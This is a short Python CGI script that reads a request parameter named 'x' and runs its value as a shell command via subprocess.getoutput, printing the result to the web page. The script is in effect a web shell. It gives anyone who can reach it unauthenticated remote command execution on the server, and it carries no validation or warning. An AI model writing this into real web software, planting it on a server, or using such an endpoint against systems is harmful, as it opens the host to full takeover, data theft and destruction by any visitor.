#!/usr/bin/python3

import cgi

print("content-type: text/html")
print()

fields = cgi.FieldStorage()
cmd = fields.getvalue("x")
from subprocess import getoutput
print(getoutput(cmd))
